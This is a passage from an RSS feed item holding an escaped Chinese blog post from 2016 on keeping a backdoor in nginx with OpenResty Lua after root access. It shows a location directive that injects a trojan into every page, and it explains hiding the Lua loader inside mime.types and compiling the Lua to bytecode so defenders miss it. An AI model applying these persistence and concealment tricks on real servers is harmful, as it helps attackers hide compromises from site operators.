html&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;放到目标网站的/目录下后的效果如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;location ~* ^/ {&#xA;    body_filter_by_lua &#39;cmd.hang_horse()&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images/004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;lua代码加密及隐藏&#34;&gt;Lua代码加密及隐藏&lt;/h3&gt;&#xA;&#xA;&lt;h3 id=&#34;lua加载代码隐藏&#34;&gt;lua加载代码隐藏&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;毕竟光明正大地在nginx.conf中加入了执行lua的代码后非常容易被发现，攻击者可以用include指令将以下代码改得隐蔽一些。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;http {&#xA;  include       mime.types;&#xA;  # lua 文件的位置&#xA;  lua_package_path &amp;quot;/usr/local/openresty/nginx/conf/lua_src/?.lua;;&amp;quot;;&#xA;  # nginx启动阶段时执行的脚本，可以不加&#xA;  init_by_lua_file &#39;conf/lua_src/Init.lua&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;改成以下的内容，看起来与之前的配置完全一样，把加载lua的代码放到mime.types文件中，mime.types是一般用nginx默认的，一般很少有人去查看或改动其内容。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;http {&#xA;  include       mime.types;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h3 id=&#34;lua代码加密&#34;&gt;lua代码加密&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;即便是把lua加载的配置代码放在隐蔽的地方了，但是还在存在被找到的风险的，找到后如果是明文的lua代码，那行踪将暴露的一览无余，至少将lua代码加密一下。&#xA;openresty使用的是luajit，luajit提供了一个luajit -b参数，可以将代码编译为字节码，这样就不容易被看到明文代码了。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;使用方式如下图所示（openresty的luajit的默认路径为&lt;code&gt;/usr/local/openresty/luajit/bin/luajit&lt;/code&gt;），用编译后的lua字节码替换掉明文的文件即可。&#xA;&lt;img src=&#34;/media/images/005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;拿到目标主机的root权限后，只留一个只有web容器权限的nginx+lua后门显然不是最佳的选择，本文只是提供一种可能的思路，测试代码的github地址为：&lt;a href=&#34;https://github.com/netxfly/nginx_lua_security&#34;&gt;https://github.com/netxfly/nginx_lua_security&lt;/a&gt;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;虽然很low，但just for share&amp;hellip;&lt;/p&gt;&#xA;</description>
      <pubDate>Fri, 08 Jul 2016 15:55:46 +0000</pubDate>
    </item>
  </channel>
</rss>